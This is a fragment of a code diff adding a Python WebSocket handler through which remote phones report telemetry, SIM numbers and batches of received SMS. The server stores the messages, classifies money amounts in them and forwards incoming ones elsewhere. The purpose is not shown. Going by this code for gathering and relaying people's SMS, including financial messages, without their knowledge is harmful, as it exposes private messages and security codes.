+            "last_seen": utc_now().isoformat(),
+        })
+
+        try:
+            pending_count = outbox.count_documents(
+                {"device_id": device_id, "status": "pending"}
+            )
+        except PyMongoError:
+            pending_count = 0
+
+        await websocket.send_json({
+            "type": "hello",
+            "server_time": utc_now().isoformat(),
+            "pending": pending_count,
+        })
+
+        await push_outbox(device_id)
+
+        while True:
+            raw = await websocket.receive_text()
+            if len(raw) > MAX_WS_TEXT_BYTES:
+                continue
+
+            try:
+                msg = json.loads(raw)
+            except json.JSONDecodeError:
+                continue
+
+            mtype = str(msg.get("type") or "").lower()
+            hub.last_pong[device_id] = time.time()
+
+            now_ts = time.time()
+            if now_ts - last_seen_push > 5:
+                last_seen_push = now_ts
+                try:
+                    devices.update_one(
+                        {"_id": device["_id"]}, {"$set": {"last_seen": utc_now()}}
+                    )
+                except PyMongoError:
+                    pass
+
+            if mtype in ("ping", "heartbeat"):
+                await websocket.send_json({"type": "pong", "ts": int(time.time())})
+                continue
+
+            if mtype == "pong":
+                continue
+
+            if mtype == "telemetry":
+                data = msg.get("data") if isinstance(msg.get("data"), dict) else msg.get("telemetry")
+                if isinstance(data, dict):
+                    apply_telemetry(device, data)
+                    broadcast_device(device_id, {
+                        "ws_connected": True,
+                        "telemetry": data,
+                        "last_seen": utc_now().isoformat(),
+                    })
+
+            elif mtype == "command_result":
+                data = msg.get("data") if isinstance(msg.get("data"), dict) else {}
+                action = str(msg.get("action") or "").lower()
+                if action in ("fetch_number", "number", "sim_info", "telemetry",
+                              "refresh_telemetry"):
+                    apply_telemetry(device, data)
+                    if data.get("sim_number"):
+                        try:
+                            devices.update_one(
+                                {"_id": device["_id"]},
+                                {"$set": {"number_requested_at": None}},
+                            )
+                        except PyMongoError:
+                            pass
+                    broadcast_device(device_id, {"ws_connected": True, "telemetry": data})
+
+            elif mtype == "ack":
+                item_id = msg.get("id")
+                if item_id:
+                    try:
+                        await _ack_outbox(
+                            str(item_id),
+                            str(msg.get("status") or "sent"),
+                            str(msg.get("error") or ""),
+                        )
+                    except HTTPException:
+                        pass
+
+            elif mtype == "inbox":
+                for item in (msg.get("items") or [])[:50]:
+                    if not isinstance(item, dict):
+                        continue
+                    body = str(item.get("body") or "")[:MAX_SMS_BODY]
+                    address = str(item.get("address") or "")[:64]
+                    if not body:
+                        continue
+                    kind, amount, flow = classify_sms(address, body)
+                    mid = insert_message({
+                        "device_id": device_id,
+                        "device_name": device.get("device_name", "Unknown"),
+                        "direction": str(item.get("direction") or "in")[:8],
+                        "address": address,
+                        "body": body,
+                        "kind": kind,
+                        "amount": amount,
+                        "flow": flow,
+                        "status": "received",
+                        "created_at": utc_now(),
+                    })
+                    if mid:
+                        try:
+                            broadcast_message(messages.find_one({"_id": mid}))
+                        except PyMongoError:
+                            pass
+                        if str(item.get("direction") or "in") == "in":
+                            spawn(relay_forward_incoming(device, address, body))
+
+    except WebSocketDisconnect:
+        pass
+    except Exception:
+        pass
+    finally:
+        ping_task.cancel()
+        await hub.remove_device(device_id, websocket)
+        try:
+            devices.update_one({"_id": device["_id"]}, {"$set": {"ws_connected": False}})
+        except PyMongoError:
+            pass
+        broadcast_device(device_id, {"ws_connected": False, "status": "Offline"})
+        log_event("device_socket_close", {"device_id": device_id})
